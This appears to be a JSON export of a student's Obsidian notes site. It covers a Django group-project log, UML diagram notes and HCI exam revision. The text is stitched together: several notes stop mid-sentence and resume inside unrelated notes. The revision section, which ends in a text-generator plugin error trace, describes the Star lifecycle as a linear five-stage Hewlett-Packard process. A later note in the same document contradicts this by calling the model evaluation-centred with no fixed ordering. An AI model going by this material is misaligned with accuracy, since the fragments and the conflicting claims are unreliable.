`detail/the-forum-is-buggy/` where it correctly displays:\n    \n      - User information, including uploaded picture.\n      - Description of the post.\n      - Title.\n\n11. Implemented a counter for post views\n    Using the HitCount module the application now counts how many times a page was visited, based on the user's IP address.\n\n12. User can now add a comment and a reply\n    Through the admin panel we can now add comments to posts and replies. You can also link a comment to a reply and vice-versa.\n\n13. Fine tuning the retrievals\n    Mainly minor fixes for example retrieving the number of comments in a post and also making sure we can access all pages through the navigation bar at the top.\n\n14. Merged previous working game\n    I have managed to merge most of our previous work. The main, and big, issue is that I couldn't successfully (and easily) merge the registration system. I think it would have to re-done using Django.\n    \n    We could still use the same MySQL database, it seems easy to implement. However, I am unsure about the backend as PHP doesn't seem like a good approach.\n    \n    The game is there but it is not functional. It seems to some issue with the timer.\n\n### 08/12\n---\n15. Authentication system\n    The user can now create an account. They then get redirected to an update profile page, where they can set their author name, profile picture and bio. I am using the module `crispy_forms` and Django's own authentication system.\n\n16. Profile pic gets uploaded (in update)\n    User can **only** access the game if they are logged in.\n    \n    There was a bug where the updated profile pic wasn't being uploaded.\n\n17. Finished registration\n    All done with the registration system, allowing the user to change their details and logout.\n\n    I noticed a **bug** where the tag and topic they choose is **not** getting sent to the database, so I have to re-select it when approving.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2001"]},"/notes/university/year2/cs2001/group-project-intro-gp20":{"title":"Introduction","content":"The theme of the project will be based on the [UN Sustainable Development Goals](https://www.un.org/sustainabledevelopment/).\n\n![Screenshot 2022-09-19 at 14.25.54](notes/images/Screenshot%202022-09-19%20at%2014.25.54.png)\n\nIt will be a **full-stack web application with a server backend, pulling and pushing data from and to a data source.

For example, you might have make changes to the use case diagram when developing the class diagram and vice-versa. Normally the sequence diagram is the last one and is closely related to the class diagram.\n\nMessage is the act of calling a method which is related to another class.\n\nThe name of the use case **must** contain a verb.\n\nAll the methods used in the sequence diagram **must** exist in the class diagram.\n\nA **trace** is the sequence of messages sent.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2002"]},"/notes/university/year2/cs2002/creating-a-use-case-diagram":{"title":"UML @ Classroom - Chapter 3 (Creating a Use Case Diagram)","content":"This is continuation of my [notes](notes/university/year2/cs2002/uml-classroom-chap3.md) on Use Case Diagrams from the book UML @ Classroom.\n\nThe first step is to identify actors and use cases and then place them in relationships with one another. You then describe the use cases in detail.\n\n# Identifying Actors and Use Cases\n---\n1. Analysis of requirements documents.\n2. Analysis of the expectations of future users.\n\nTo identify the actor:\n\n- Who uses the main use case?\n- Who needs support for their daily work?\n- Who is responsible for system administration?\n- What are the external devices/software systems with which the system must communicate?\n- Who has an interest in the results of the system?\n\nThen you can derive the use cases:\n\n- What are the main tasks that an actor must perform?\n- Does an actor want to query or even modify information contained in the system?\n- Does an actor want to inform the system about changes in other systems?\n- Should an actor be informed about unexpected events within the system?\n\nYou often start with top level requirements and then continue to refine them until you have specified what the system is able to do. For example, a top level requirement for a university administration system could be that the system can be used for student administration. If we refine it, we define that new students should be able to register at the university and enroll for studies, that the students' grades should be stored etc.\n\n# Describing Use Cases\n---\nShort concise names.\n\nGuideline for the length of use case description is approximately 1-2 pages per use case. Structured approach:\n\n-   Name\n-   Short description\n-   Precondition: prerequisite for successful execution\n-   Postcondition: system state after successful execution\n-   Error situations: errors relevant to the problem domain\n-   System state on the occurrence of an error\n-   Actors that communicate with the use case\n-   Trigger: events which initiate/start the use case\n-   Standard process: individual steps to be taken\n-   Alternative processes: deviations from the standard process\n\nExample:\n\n![Screenshot 2022-10-03 at 16.59.59](notes/images/Screenshot%202022-10-03%20at%2016.59.59.png)\n\n# Pitfalls\n---\n## Modeling Processes\nWe do not model processes or workflows in use case diagrams.\n\nThe functionality that one of these use cases offers is not part of the functionality that another use case offers, hence the use cases must be used independently of one another.\n\n![Screenshot 2022-10-03 at 17.01.05](notes/images/Screenshot%202022-10-03%20at%2017.01.05.png)\n\n## Setting system boundaries incorrectly\n![Screenshot 2022-10-03 at 17.01.32](notes/images/Screenshot%202022-10-03%20at%2017.01.32.png)\n\n## Mixing abstraction levels\nAvoid representing top level use cases with technically oriented use cases in the same diagram, like in the figure below.\n\nTo avoid this you should proceed iteratively. First creating the use case diagram with use cases that are based on the business objectives (for example management of student data) and then refine the use cases down to the technical requirements (selecting a printer).\n\n![Screenshot 2022-10-03 at 17.02.57](notes/images/Screenshot%202022-10-03%20at%2017.02.57.png)\n\n## Functional decomposition\nUse cases, even included or extending ones, can always be executed independently. If they can only be executed within the scope of another use case and not independently, they are not use cases and must not be depicted as such.\n\nIn the figure below, the use case Issue certificate is broken down into individual sub-functions necessary to execute it.

State machine diagrams are used as follows:\n- To model the possible **states** of a system or object.\n- To show how state **transitions** occur as a consequence of events.\n- To show what **behaviour** the system or object exhibits in each state.\n\nFor example: high-level description of the behaviour of a lecture hall:\n\n![Screenshot 2022-11-07 at 12.55.04](notes/images/Screenshot%202022-11-07%20at%2012.55.04.png)\n\nWhere occupy() and release() are the **transitions** and \"free = true\"/\"free = false\" are the **states**.\n\nAnother example would be a Digital Clock:\n![Screenshot 2022-11-07 at 12.56.27](notes/images/Screenshot%202022-11-07%20at%2012.56.27.png)\n\n# States\n---\nThey are nodes of the state machine:\n\n![200](notes/images/Screenshot%202022-11-07%20at%2012.56.59.png)\n\nWhen a state is active:\n- The object is in that state.\n- All internal activities specified in this state can be executed, meaning an activity can consist of multiple actions.\n\nentry/Activity(...)\n- Executed when the object enters the state.\n\nexit/Activity(...)\n- Executed when the object exits the state.\n\ndo/Activity(...)\n- Executed while the object remains in this state.\n\n![200](notes/images/Screenshot%202022-11-07%20at%2012.58.46.png)\n\n# Transitions\n---\n## Syntax\nChange from one state to another:\n\n![370](notes/images/Screenshot%202022-11-07%20at%2012.59.10.png)\n\n- Event (trigger)\n    - Exogenous (has an external cause or origin) stimulus.\n    - Can trigger a state transition.\n\n- Guard (condition)\n    - Boolean expression.\n    - If the event occurs, the guard is checked.\n    - If the guard is true:\n        - All activities in the current state are terminated.\n        - Any relevant exit activity is executed.\n        - The transition takes place.\n    - If the guard is false:\n        - No state transition takes place, the event is discarded.\n\n- Activity (effect)\n     - Sequence of actions executed during the state transition.\n\n## Types\n- Internal:\n\n![300](notes/images/Screenshot%202022-11-07%20at%2013.11.26.png)\n\n- External:\n\n![300](notes/images/Screenshot%202022-11-07%20at%2013.11.42.png)\n\n### When do the following transitions take place?\n![Screenshot 2022-11-07 at 13.12.28](notes/images/Screenshot%202022-11-07%20at%2013.12.28.png)\n\n## Sequence of Activity Executions\nAssuming $S1$ is active, what is the value of $x$ after $e$ occurred?\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.15.10.png)\n\n- $S1$ becomes active, $x$ is set to the value 4.\n- $e$ occurs, the guard is checked and evaluates to true.\n- $S1$ is left, $x$ is set to 5.\n- The transition takes place, $x$ is set to 10.\n- $S2$ is entered, $x$ is set to 11.\n\nRegistration status of an exam example:\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.18.22.png)\n\n# Types of Events\n---\n## Signal Event\nReceipt of a sinal.\n- e.g.: `rightmousedown`, `sendSMS(message)`.\n\n## Call Event\nOperation call.\n-  e.g.: `occupy(user, lectureHall)`, `register(exam)`.\n\n## Time Event\nTime-based state transition:\n- Relative: based on the time of the occurrence of the event.\n    - e.g.: `after(5 seconds)`.\n- Absolute\n    - e.g.: `when(time==16:00)`, `when(data==20150101)`.\n\n## Any Receive Event\nOccurs when any event occurs that does not trigger another transition from the active state:\n- Keyword **all**.\n\n## Completion Event\nGenerated automatically when everything to be done in the current state is complete.\n\n## Change Event\nPermanently checking whether a condition becomes true.\n\nE.g.: `when(x \u003e y), after(90min)`.\n\n# Change Event vs Guard\n---\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.25.png)\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.36.png)\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.23.48.png)\n\n# Types of States\n---\n## Initial State\nIt is a **pseudo-state**, meaning it is transient (system cannot remain in that state). It is more of a control structure than a real state.\n\nNo incoming edges.\n\n- If \u003e 1 outgoing edges:\n    - Guards must be mutually exclusive and cover all possible cases to ensure that exactly one target state is reached.\n\n- If initial state becomes active, the object immediately switches to the next state.\n    - No events allowed on the outgoing edges (exception: `new()`).\n\n## Final State and Terminate Node\n- Final State\n    - Real state.\n    - Marks the end of the sequence of state.\n    - Object can remain in a final state forever.\n    - ![25](notes/images/Screenshot%202022-11-07%20at%2013.29.28.png)\n\n- Terminate Node\n    - Pseudo-state.\n    - Terminates the state machine.\n    - The modelled object ceases to exist (= is deleted).\n    - ![25](notes/images/Screenshot%202022-11-07%20at%2013.30.21.png)\n\n## Decision Node\nIt is a pseudo-state and is used to model alternative transitions.\n\n![500](notes/images/Screenshot%202022-11-07%20at%2013.30.54.png)\n\n### Example\n![500](notes/images/Screenshot%202022-11-07%20at%2013.31.12.png)\n\n## Parallelisation and Synchronisation Node\n- Parallelisation node\n    -

When the action has completed, it passes the token to a subsequent action and the execution of this action is trigged.\n\nGuards can prevent the passing of a token, as they are **stored in the previous node**.\n\n**Control token**: \"execution permission\" for a node.\n\n**Object token**: transport data + \"execution permission\".\n\n![|160](notes/images/Screenshot%202022-12-14%20at%2012.34.15.png)\n\n# Beginning and Termination of Activities\n---\n![|20](notes/images/Screenshot%202022-12-14%20at%2012.34.56.png) Initial node:\n- Starts the execution of an activity.\n- Provides tokens at all outgoing edges.\n- Keeps tokens until the successive nodes accept them.\n- Multiple initial nodes to model concurrency.\n\n![|20](notes/images/Screenshot%202022-12-14%20at%2012.36.17.png) Activity final node:\n- Ends all flows of an activity.\n- First token that reaches the activity final node terminates the entire activity.\n    - Concurrent subpaths included.\n- Other control and object tokens are deleted.\n    - Exception: object tokens that are already present at the output parameters of the activity.\n\n![|20](notes/images/Screenshot%202022-12-14%20at%2012.38.44.png) Flow final node:\n- Ends one execution path of an activity.\n- All other tokens of the activity remain unaffected.\n\n# Alternative Paths \n---\n![|600](notes/images/Screenshot%202022-12-14%20at%2012.44.32.png)\n\n## Decision Node\n---\nUsed to defined alternative branches.\n\n„Switch point“ for tokens.\n\nOutgoing edges have guards:\n- Syntax: \\[Boolean expression].\n- Token takes **one** branch.\n- Guards must be mutually exclusive.\n- Predefined: \\[else].\n\n![|300](notes/images/Screenshot%202022-12-14%20at%2012.42.25.png)\n\nDecision behaviour:\n- Specify behaviour that is not necessary for the evaluation of the guards.\n- Execution must not have side effects.\n\n![|150](notes/images/Screenshot%202022-12-14%20at%2012.42.06.png)\n\n## Merge Node\n---\nUsed to bring **alternative** subpaths together.

**Nouns** often indicate **classes**.\n    - **Adjectives** indicate attribute **values**.\n    - **Verbs** indicate **operations**.\n\n- Example: The library management system stores users with their unique ID, name and address as well as books with their title, author and ISBN number. \n\n![Screenshot 2022-10-21 at 13.48.48|400](notes/images/Screenshot%202022-10-21%20at%2013.48.48.png)\n\n# Notation\n---\n| Name                             | Notation                                                | Description                                                                                         |\n| -------------------------------- | ------------------------------------------------------- | --------------------------------------------------------------------------------------------------- |\n| Class                            | ![Screenshot 2022-10-21 at 13.51.48](notes/images/Screenshot%202022-10-21%20at%2013.51.48.png) | Description of the structure and behaviour of a set of objects.                                     |\n| Abstract Class                   | ![Screenshot 2022-10-21 at 13.54.37](notes/images/Screenshot%202022-10-21%20at%2013.54.37.png) | Class that cannot be instantiated.                                                                  |\n| Association                      | ![Screenshot 2022-10-21 at 13.55.00](notes/images/Screenshot%202022-10-21%20at%2013.55.00.png) | Relationship between classes where navigability is unspecified or bidirectional or one directional. |\n| n-ary Association                | ![Screenshot 2022-10-21 at 13.55.59](notes/images/Screenshot%202022-10-21%20at%2013.55.59.png) | Relationship between n (here 3) classes.                                                            |\n| Association Class                | ![Screenshot 2022-10-21 at 13.56.24](notes/images/Screenshot%202022-10-21%20at%2013.56.24.png) | More detailed description of an association.                                                        |\n| `xor` Relationship               | ![Screenshot 2022-10-21 at 13.56.47](notes/images/Screenshot%202022-10-21%20at%2013.56.47.png) | An object of `C` is in a relationship with `A` or with `B` but not both.                            |\n| Shared aggregation               | ![Screenshot 2022-10-21 at 13.57.45](notes/images/Screenshot%202022-10-21%20at%2013.57.45.png) | Parts-whole relationship (`A` is part of `B`)                                                       |\n| Strong aggregation (composition) | ![Screenshot 2022-10-21 at 13.58.08](notes/images/Screenshot%202022-10-21%20at%2013.58.08.png) | Existence-dependant parts-whole relationship (`A` is part of `B`)                                   |\n| Generalisation                   | ![Screenshot 2022-10-21 at 13.58.34](notes/images/Screenshot%202022-10-21%20at%2013.58.34.png) | Inheritance relationship (`A` inherits from `B`)                                                    |\n| Object                           | ![Screenshot 2022-10-21 at 13.58.54](notes/images/Screenshot%202022-10-21%20at%2013.58.54.png) | Instance of class.                                                                                  |\n| Link                             | ![Screenshot 2022-10-21 at 13.59.15](notes/images/Screenshot%202022-10-21%20at%2013.59.15.png) | Relationship between objects.                                                                                                    |\n","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["cs/uml","university/cs2002"]},"/notes/university/year2/cs2002/uml-classroom-chap3":{"title":"UML @ Classroom - Chapter 3 (Use Case Diagram)","content":"# Use Case Diagram\n---\n- Allows to describe the possible usage scenarios (use cases) that a system is developed for.\n- Doesn't address realisation details, for example data structures or algorithms.\n- Use case: what the customer wants the system to do, the requirements.\n\nWe can employ it to answer the following questions:\n\n1. What is being described? (The system)\n2. Who interacts with the system? (The actors)\n3. What can the actors do? (The use cases)\n\n## Use Cases\n---\nDescribes the functionality expected from the system to be developed.\n\nIt is triggered either by invocation of an actor or by a **trigger event**. They are determined by collecting customer wishes and analysing problems. They can also be used to document the functionality that a system offers.\n\n![Screenshot 2022-10-03 at 15.41.51](notes/images/Screenshot%202022-10-03%20at%2015.41.51.png)\n\nThe rectangle symbolises the boundaries of the system to be described:\n\n![Screenshot 2022-10-03 at 15.42.24](notes/images/Screenshot%202022-10-03%20at%2015.42.24.png)\n\n## Actors\n---\nWho works and interacts with the system.\n\nThey can be human or non-human.\n\n- Active actor: initiates the execution of use cases.\n- Passive actor: is used by the system.\n\nIn the example below Professor is an **active** actor while the E-mail Server is **passive**.\n\n- Primary actor: takes an actual benefit from the execution of the use case (the Professor).\n- Secondary actor: receives no direct benefit from the execution of the use case. It **does not** need to be necessarily passive.\n\nAs you can see, both Professor and Student are actively involved in the execution of the use case Exam, the main beneficiary being the Student. Professor has a lower benefit from the exam but is necessary for the execution of the use case.\n\n![Screenshot 2022-10-03 at 15.46.30](notes/images/Screenshot%202022-10-03%20at%2015.46.30.png)\n\nActors are **always** outside the system.\n\n## Associations\n---\nExpresses that the actor communicates with the system and uses a certain functionality.\n\nEvery actor must communicate with at least one use case and vice-versa.\n\nAssociations are always binary, meaning that it is always specified between one use case and one actor.\n\n- Multiplicity:\n\n![Screenshot 2022-10-03 at 15.48.24](notes/images/Screenshot%202022-10-03%20at%2015.48.24.png)\n\nActors represent **roles**.\n\n## Relationships between Actors\n---\nActors can have common properties. For example, not only professors but assistants are permitted to view student data. To handle this, we use an **inheritance relationship** (generalisation).\n\nWhen actor Y (sub-actor) inherits from actor X (super-actor), Y is involved with all use cases with which X is involved.\n\nIn the image below the actors Professor and Assistant inherit from the actor Research Associate, meaning every professor and every assistant is a research associate. Every research associate can Query student data, but only professors can create a new course and tasks can only be published by assistants. To execute Issue certificate, we need a professor but an assistant can be involved optionally (0..1).\n\n![Screenshot 2022-10-03 at 15.52.06](notes/images/Screenshot%202022-10-03%20at%2015.52.06.png)\n\nTwo actors participating in a use case vs two actors having a common super-actor that participates in the use case:\n\n![Screenshot 2022-10-03 at 15.53.02](notes/images/Screenshot%202022-10-03%20at%2015.53.02.png)\n\n- **Abstract**: if there is no instance of an actor.\n\n## Relationships between Use Cases\n---\n![Screenshot 2022-10-03 at 15.58.12](notes/images/Screenshot%202022-10-03%20at%2015.58.12.png)\n\n### Include\nThe behaviour of the included use case (B) is integrated into the behaviour of the base use case (A). The included use case can be executed on its own. It is analogous to **calling a subroutine**.\n\n![Screenshot 2022-10-03 at 15.58.20|200](notes/images/Screenshot%202022-10-03%20at%2015.58.20.png)\n\nIn the example, Announce lecture is the **base use case** - meaning when a new lecture is announced, the use case Assign lecturer must also be executed. The actor Professor is involved in the execution of **both** use cases.\n\nPoints from the base.\n\n### Extend\nIf a use case B is in an `\u003c\u003cextend\u003e\u003e` relationship with a use case A (base use case), then A can use the behaviour of B (extending use case) but does not have to. B can be activated by A in order to insert the behaviour of B in A.\n\nBoth use cases can be executed independently of one another.\n\n![Screenshot 2022-10-03 at 16.00.27|200](notes/images/Screenshot%202022-10-03%20at%2016.00.27.png)\n\nFor example, when a new lecture is announced, it is possible (not mandatory) to reserve a lecture hall. \n\nA use case can act as an extending use case several times or can itself be extended by several use cases.\n\nPoints towards the base.\n\n### Condition\nExtending relationships can have conditions, which must be fulfilled for the base use case to insert the behaviour of the extending use case.\n\n![Screenshot 2022-10-03 at 16.01.47](notes/images/Screenshot%202022-10-03%20at%2016.01.47.png)\n\n### Extension Points\nAllows you define the point at which the behaviour of the extending use cases must be inserted in the base use case.\n\n### Generalisation\nAllows to group common properties and behaviours of different use cases in a parent use case.\n\nIf A generalises B, B inherits the behaviours of A, which B can either extend or overwrite. It also inherits all relationships from A. Therefore, B adopts the basic functionality of A but decides itself what part of A is executed or changed.\n\nUses an arrow:\n\n![Screenshot 2022-10-03 at 16.45.00|200](notes/images/Screenshot%202022-10-03%20at%2016.45.00.png)\n\nFor example, Announce event passes on its properties and behaviours to Announce lecture and Announce talk. As a result of `\u003c\u003cinclude\u003e\u003e`, both must execute the behaviour of the use case Assign lecturer. When a lecture is announced, an exam can also be announced at the same time. They both inherit the relationship from the use case Announce event to the actor Professor. Thus, all use cases are connected to at least one actor.\n\n![Screenshot 2022-10-03 at 16.05.57](notes/images/Screenshot%202022-10-03%20at%2016.05.57.png)\n\nWe grouped the common features of Announce lecture and Announce talk, meaning we don't have to model both the `\u003c\u003cinclude\u003e\u003e` relationship and the association with the professor twice.\n\n## More information\n---\n- [Creating a Use Case Diagram](notes/university/year2/cs2002/creating-a-use-case-diagram.md)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["cs/uml","university/cs2002"]},"/notes/university/year2/cs2002/uml-sequence-diagram":{"title":"UML - Sequence Diagram","content":"**Inter-object behaviour**: interactions between objects.\n\n**Interaction**: how data is exchanged between interaction partners.\n\n**Interaction partners**:\n    - Human (lectures, administrator, ...)\n    - Non-human (sever, printer, executable software, ...)\n\nExamples of interactions: \n- Conversation between persons.\n- Message exchange between humans and a software system.\n- Communication protocols.\n- Sequence of method calls in a program.\n\n# Interaction Diagrams\n---\nUsed to:\n1.

Familiarise yourself with Usability Engineering Principles by Don Norman. You should be able to provide a good understanding of UE principles and how they are implemented, as you will need to show this in sketch form in the exam.\n\nDon Norman's usability engineering principles are known as the \"Seven Principles of Design\". These principles are:\n\n1. Visibility: Users should be able to easily see and understand what actions are available to them. Include visual cues that make it clear which actions are available to users.\n2. Feedback: Users should receive feedback when they interact with a system, so they know what has happened or what is happening. Include animations or other feedback that let users know when an action has been completed.\n3. Constraints: Constraints should be put in place to prevent users from making mistakes or taking unintended actions. Limit user options to prevent unintended actions.\n4. Mapping: The relationship between controls and their effects should be intuitive and easy to understand. Create intuitive mappings between controls and their effects.\n5. Consistency: The system should behave in a consistent manner throughout all interactions with the user. Maintain consistency throughout the interface.\n6. Affordance: The design of a control or interface element should suggest its function, making it clear how it can be used. Use design elements that suggest functionality.\n7. Simplicity: The design of the system should be as simple as possible, while still being effective for the task at hand. Keep the overall design simple and easy to navigate.\n\nYou might use color coding or icons to indicate interactive elements, provide tooltips or other visual feedback when a button is clicked, limit user input options based on context, use common UI patterns like checkboxes or drop-down menus, maintain consistent button placement and labelling throughout the interface, use familiar icons for common actions like saving or printing, and avoid cluttering screens with unnecessary elements.\n\n---\n# Second section:\n\n2. Familiarise yourself with Usability Engineer lifecycles and estimate how long a task would take you. You should be able to describe the lifecycle and justify why you have selected a model and justify the duration. You need to know at least two lifecycles.\n\n## Star Lifecycle Model [\\[More\\]](notes/university/year2/cs2003/user-centred-design.md#Star%20Lifecycle%20(1989))\n---\nThe Star Lifecycle method was developed by Hewlett-Packard (HP) in the late 1980s.\n\nThe star lifecycle model is a methodology used in software development that involves a five-stage process for creating and maintaining software systems. The five stages are:\n\n1.  **Requirements**: This is the initial stage where the requirements of the software system are gathered and analysed. The goal of this stage is to identify what the software system needs to do and how it should behave.\n2.  **Design**: In this stage, the requirements gathered in the previous stage are used to create a design for the software system. The design includes decisions about the architecture, programming language, data storage, and user interface.\n3.  **Implementation**: This stage involves the actual coding of the software system. The design created in the previous stage is used as a blueprint for the development of the software system.\n4.  **Testing**: This stage involves testing the software system to ensure that it meets the requirements gathered in the first stage. Testing can involve unit testing, integration testing, system testing, and acceptance testing.\n5.  **Maintenance**: This stage involves maintaining the software system after it has been released. Maintenance can involve fixing bugs, adding new features, and making changes to the software system to ensure it remains up-to-date.\n\n**Pros**:\n- The star lifecycle model is a well-established methodology that has been used in software development for many years.\n- The model is easy to understand and implement, which makes it a good choice for small to medium-sized software projects.\n- The model provides a clear framework for the development of software systems, which can help to ensure that the system meets the requirements of the stakeholders.\n\n**Cons**:\n- The star lifecycle model can be inflexible, which can be a problem for larger software projects where requirements can change over time.\n- The model can be time-consuming and expensive, especially if changes need to be made to the software system after it has been released.\n- The model may not be suitable for all types of software projects, such as projects that require a more iterative or agile approach.\n\nOverall, the star lifecycle model is a useful methodology for software development, but it may not be the best choice for all types of software projects. It's important to consider the specific needs of the project and the stakeholders when deciding on a software development methodology.\n\n## Double Diamond Model [\\[More\\]](notes/university/year2/cs2003/user-centred-design.md#Double%20Diamond%20(The%20British%20Design%202005))\n---\nThe Double Diamond method was developed by the UK Design Council in the mid-2000s as a way to provide a framework for the design process.\n\nThe Double Diamond method is a design process that consists of four stages: Discover, Define, Develop, and Deliver. It is a human-centered design approach that emphasises understanding the needs and desires of users and stakeholders, and using that understanding to create innovative and effective solutions to complex problems.\n\nHere is a brief overview of each stage of the Double Diamond method:\n\n1.  **Discover**: In this stage, the focus is on researching and gathering information about the problem or opportunity. The goal is to gain a deep understanding of the needs, desires, and behaviours of users and stakeholders. This stage involves techniques such as user research, ethnographic studies, and market analysis.\n2.  **Define**: In this stage, the goal is to synthesise the information gathered in the Discover stage and define the design problem. The team will develop a point of view, create design challenges, and define design criteria. The focus is on framing the problem and identifying the key goals and objectives for the project.\n3.  **Develop**: In this stage, the focus is on generating and testing potential solutions to the problem identified in the Define stage. The team will ideate, prototype, and test multiple solutions to the problem. The goal is to create and refine a solution that meets the design criteria and is feasible to implement.\n4.  **Deliver**: In this stage, the focus is on implementing and launching the final solution. The team will finalize the design, create detailed specifications, and work with engineers and other stakeholders to ensure feasibility and alignment with technical requirements. The goal is to launch a successful product or service that meets the needs of users and achieves the project's objectives.\n\n**Pros**:\n- It is a user-centered approach that emphasises understanding the needs and desires of users and stakeholders.\n- It is a structured process that can help ensure that the team stays focused on the project's goals and objectives.\n- It encourages creativity and innovation by emphasising the need to explore multiple potential solutions to the problem.\n\n**Cons**:\n- It can be time-consuming and resource-intensive, especially in the early stages of the process.\n- It requires a high level of collaboration and communication among team members and stakeholders.\n- It can be challenging to balance the need for creativity and innovation with the need for practicality and feasibility.\n\nOverall, the Double Diamond method is a useful design process for computer science students and teams looking to create innovative and effective solutions to complex problems. By emphasising a user-centered approach and a structured process, the Double Diamond method can help ensure that the team creates solutions that meet the needs of users and achieve the project's objectives.\n\n---\n# Third section:\n\n3. Familiarise yourself with Heuristic Evaluation and Cognitive Walkthrough. You should be able to describe each of these expert evaluation methods, compare and contrast them and know how to use them effectively. Know the pros and cons of each.\n\n## Heuristic Evaluation\n---\nHeuristic Evaluation is a usability inspection method in which one or more evaluators inspect a user interface using a set of predefined usability criteria or \"heuristics.\" The goal is to identify and prioritise usability issues in the interface. The evaluators are usually experts in usability or human-computer interaction and follow a systematic process to evaluate the interface against a set of heuristics or guidelines. Heuristic Evaluation can be done on any digital product, including websites, software applications, and mobile apps.\n\n**Pros**:\n- It is relatively quick and inexpensive compared to other evaluation methods.\n- It can be done early in the design process to identify potential issues before development begins.\n- It provides a structured approach to evaluating interface design, which can help ensure that important usability issues are not overlooked.\n\n**Cons**:\n- It relies on the expertise and experience of the evaluators, which can lead to subjectivity and variability in the evaluation process.\n- It may not uncover all usability issues, especially those related to user goals or context.\n\n## Cognitive Walkthrough\n---\nCognitive Walkthrough is a usability evaluation method in which evaluators simulate user interactions with a system by walking through a set of task scenarios. The goal is to identify and assess usability issues based on how easy it is for a user to complete the tasks. The evaluators examine each task scenario from the perspective of a user and evaluate the interface based on the user's goals, knowledge, and experience.\n\n**Pros**:\n- It focuses on user goals and how easy it is to complete tasks, which can provide valuable insights into the user experience.\n- It can be used to identify usability issues related to user knowledge and experience, which may not be identified through other evaluation methods.\n- It can be used to evaluate different design alternatives and compare their usability.\n\n**Cons**:\n- It can be time-consuming, especially if a large number of task scenarios are evaluated.\n- It relies on the evaluators' ability to simulate the user's thought process accurately, which can be challenging.\n- It may not identify all usability issues, especially those related to user behaviour or context.\n\u003e [!failure]- Failure \n\u003e   Error: There is another generation process\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:56949 TextGenerator.eval\n\u003e     plugin:obsidian-textgenerator-plugin:56949:31\n\u003e   \n\u003e   - Generator.next\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:78 eval\n\u003e     plugin:obsidian-textgenerator-plugin:78:61\n\u003e   \n\u003e   - new Promise\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:62 __async\n\u003e     plugin:obsidian-textgenerator-plugin:62:10\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:56935 TextGenerator.generate\n\u003e     plugin:obsidian-textgenerator-plugin:56935:12\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:58440 AutoSuggest.eval\n\u003e     plugin:obsidian-textgenerator-plugin:58440:52\n\u003e   \n\u003e   - Generator.next\n\u003e   \n\u003e   - plugin:obsidian-textgenerator-plugin:78 eval\n\u003e     plugin:obsidian-textgenerator-plugin:78:61\n\u003e   \n\u003e   - new Promise\n\u003e   \n\u003e  \n","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2003","university/exam2023"]},"/notes/university/year2/cs2003/specifying-user-requirements":{"title":"Specifying User Requirements","content":"Selecting an appropriate UCD (User Centred Design) method is **vital**.\n\n```toc\n```\n\n## Human-Centred Design Process: ISO 13407\n---\nIts goal is to achieve **usable** systems.\n\nIt is a standard, a framework for applying HCD and evaluation techniques.\n\nIt supplements existing lifecycle modes by specifying general activities to be performed in development, but it doesn't demand or recommend particular techniques or methods.\n\nIt defines one stage of UCD as the **specification of user and organisational requirements**.\n\nThis should:\n- **Identify** the range of relevant users and other personnel in the design.\n- Provide a clear statement of the HCD **goals**.\n- Set appropriate **priorities** for the different requirements.\n- Provide **measurable criteria** against which the emerging design can be tested.\n- Be adequately **documented**.\n\n## The Star Life Cycle\n---\nIt emphasises that ordering of activities is inappropriate.\n\nIt is evaluation centred and encourages iteration.\n\n![400](notes/images/Screenshot%202022-11-18%20at%2011.22.13.png)\n\n## User Requirements\n---\nDetermining user needs can be quite hard, because:\n- User rarely knows what is possible.\n- User may not know their needs, what they need to achieve their goals and interests.\n\nSpecifying a design is not just giving people what they ask for, again they don't really know what they want.\n\nIt is important to **define** user requirements as they determine what we are trying to create in the design process, especially early on.\n\nIt also supports defining **usability** requirements:\n- Useful in early design, but more critical at the evaluation stages.\n- Asks: how do you asses if your design is or will be successful?\n\n### Why gather requirements?\n---\nThey aren't usually a \"given\" factor:\n- They **aren't always what they initially appear to be**, or what designers are told that they are.\n- Stakeholders **conflicts** can arrive.\n    - Including **within the design/development** phase.\n\n### How to Identify Requirements\n---\n![600](notes/images/Screenshot%202022-11-18%20at%2011.28.41.png)\n\nYou need to identify:\n- What\n    - The things they use to do the work.\n- Who\n    - The people involved with the work.\n- Where\n    - Where the work is done.\n- When\n    - What time is the work done.\n- How\n    - The processes that involved in the work.\n- The information required to do the work.\n- The constraints imposed on the work.\n- The problems they face in the work.\n- The inputs required by the work.\n- The outputs created by the work.\n- Why\n    - They do they do they work, and in this way.\n\n#### Different Types of Requirements\nFunctional:\n- What a system is supposed **to do**.\n- Is it **necessary**? Is it **useful**?\n\nNon-functional:\n- How a system is supposed **to be**?\n- Often called **qualities** of a system.\n- **Criteria** that can be used to judge the operation of a system.\n- Your usability requirements should describe the context of use:\n    - Who, what, when, where, and why.\n\nUser Requirements:\n- Define how to meet users **physical and cognitive needs**.\n    - Who will be **using it**, in what environments (e.g. knowledge, roles, abilities).\n\nUsability Requirements:\n- Specifies a required amount of usability: a **measurable** quality, so an **engineering** target, for example around\n    - Efficiency: goals are easy/quick to accomplish, with few/no user errors.\n    - Intuitiveness: easy to learn and navigate, simple to understand.\n    - Low perceived workload: not intimidating, demanding or frustrating.\n\n## What is a \"right\" requirement?\n---\n1. Just in time, just enough detail.\n    - Can take a long time to do, **no more than is necessary**.\n2. Realistic.\n    - Don't expect too much.\n3. Clearly and unambiguously defined.\n4. Relevant\n    - Relevant to designers, relevant to the next cycle of the design process, helps solve a design problem/question.\n\n## Personas\n---\nThey are documents that **describe** typical **target users**.\n\nThey are a critical method for orienting design and development teams to **user experience**.\n\nA persona represents an aggregate of target users who **share common behavioural characteristics**, for example is a hypothetical archetype of real user.\n\nPerona perspectives: goal, role, engaging, fiction.\n\nMore info [here](https://www.interaction-design.org/literature/book/the-encyclopedia-of-human-computer-interaction-2nd-ed/personas).\n\n[Online persona 